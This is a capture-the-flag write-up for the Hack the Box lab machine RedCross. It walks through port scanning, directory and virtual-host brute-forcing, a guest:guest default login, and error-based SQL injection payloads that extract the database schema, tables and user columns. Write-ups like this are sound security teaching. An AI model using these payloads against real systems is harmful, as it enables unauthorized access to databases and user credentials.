# Hack the Box - RedCross
```CSS
Machine IP: 10.10.10.113 - Debian
```
## Reconnaisance
**Disover all open TCP ports**
```CSS
▶ nmap -Pn -sS -p- 10.10.10.113 -T4 --min-rate 1000 -oN nmap.surface
```

**Identify and scan running services on open ports**
```CSS
▶ sudo nmap -sV -sC -p 22,80,443 10.10.10.113 -oN nmap.deep 
```

---

## Application Mapping
![image](https://user-images.githubusercontent.com/83878909/229340988-396c149d-59a9-44df-8bb8-846e1a2e6f3b.png)

---

### Directory Brute-Force
```CSS
▶ gobuster dir --url https://intra.redcross.htb --wordlist /usr/share/wordlists/directories.txt --no-tls-validation --threads 25 --output intra-dir.out
```
![image](https://user-images.githubusercontent.com/83878909/229342980-9b448de6-1f32-417a-915b-d419ef3afc08.png)

### Recursive Directory Brute-Force
```CSS
▶ gobuster dir --url https://intra.redcross.htb/pages --wordlist Common-PHP-Filenames.txt --no-tls-validation --threads 25 --output intra-dir-pages.out 
```
![image](https://user-images.githubusercontent.com/83878909/229349757-4437bdf3-24b6-4b47-aa87-b392ff82f9da.png)

### Recursive Directory Brute-Force
```CSS
▶ gobuster dir --url https://intra.redcross.htb/documentation --wordlist directory-list-2.3-small.txt --no-tls-validation  --threads 25 --output intra-dir-pages.out --extensions pdf,txt 
```
![image](https://user-images.githubusercontent.com/83878909/229352633-afb50fcf-6b44-47a5-ad7d-327324b03a67.png)

---

## Virtual Host Brute-Force
```CSS
▶ wfuzz -H 'Host: FUZZ.redcross.htb' -u 'https://10.10.10.113' -w subdomains-top1million-5000.txt --hw 28
```
![image](https://user-images.githubusercontent.com/83878909/229351137-705a4132-e00b-45b5-b551-2f9a15acb448.png)

---

## Testing for SQL Injection
  - URL: `https://intra.redcross.htb/?page=login`
  - Capture the request in BurpSuite and copy it to a text file using `Copy to file`.
  - Run `sqlmap` with the captured request. 
![image](https://user-images.githubusercontent.com/83878909/229352907-4b619112-09b4-4d94-bb9e-af767ebf9e9a.png)
![image](https://user-images.githubusercontent.com/83878909/229352924-ffbba2d9-f739-43a1-b7fa-98c14ad39f6e.png)

### SQLMap
```CSS
▶ sqlmap -r login-request.txt --force-ssl --dbms mysql --batch
```
**NOT VULNERABLE**

---

## Testing for Default Credentials on Login Page
- Logged in as Guest.
- Working credentials: `guest:guest`.
![image](https://user-images.githubusercontent.com/83878909/229353512-1722be64-2483-4f6e-aa8c-ee2d70a9786a.png)

---

## Testing for SQL Injection
  - URL: `https://intra.redcross.htb/?page=app`
  - Capture the request in BurpSuite and copy it to a text file using `Copy to file`.
  - Run `sqlmap` with the captured request. 
![image](https://user-images.githubusercontent.com/83878909/229353680-3ca112d1-6c52-48ae-a39c-107c461459c9.png)

### SQLMap
```CSS
▶ sqlmap -r userid-filter-request.txt -p o --force-ssl --dbms mysql --batch
```
## Manual Testing
  - Inject a `'` after the `o` parameter in the query.
![image](https://user-images.githubusercontent.com/83878909/229354603-aef8edb5-23e7-40b8-8785-f45b4515d517.png)
  - Extract: Version information.
  - Query: `') and extractvalue(0x0a,concat(0x0a,version()))-- -`
![image](https://user-images.githubusercontent.com/83878909/229354803-2b283325-cc0c-4561-bceb-4a890f1a6e1d.png)
 ## Database Name 
  - Extract: Database name.
  - Query: `') and extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229359923-16a7107b-f98b-4294-8816-c672d7690dd6.png)
 ## Tables
  - Extract: Table names in the database `redcross`.
  - Query (Table 1): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 0,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229360263-2a8cfc98-5fb3-4d9b-ab61-71836b0aae34.png)
  - Query (Table 2): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 1,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229360434-d3ce41fa-586c-430a-b4f7-89549b2704e1.png)  
  - Query (Table 3): `') and extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 2,1)))-- -`
![image](https://user-images.githubusercontent.com/83878909/229360478-52232c71-b380-404e-a649-e99f5afa4759.png)
- Tables Found: messages, requests and users.

## Columns
  - Extract: Column names in the table `users`.
  - Query (Column 1): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 0,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364564-7f7b5fbe-e17b-4c60-b28e-e9c8b36a9e4a.png)
  - Query (Column 2): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 1,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364190-97f1d230-b4a4-45d8-900a-50c7707eb9fd.png)
  - Query (Column 3): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 2,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364271-a10fe1c5-7311-4d04-9c64-96141184e967.png)
  - Query (Column 4): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 3,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364423-652f1974-229c-49b6-a88c-e6d010103f4b.png)
  - Query (Column 5): `') and extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 5,1)))-- -`.
![image](https://user-images.githubusercontent.com/83878909/229364516-a25c1339-8f3c-4d66-8691-251dab9d1289.png)
- Columns Found: id, username, password, mail and role.
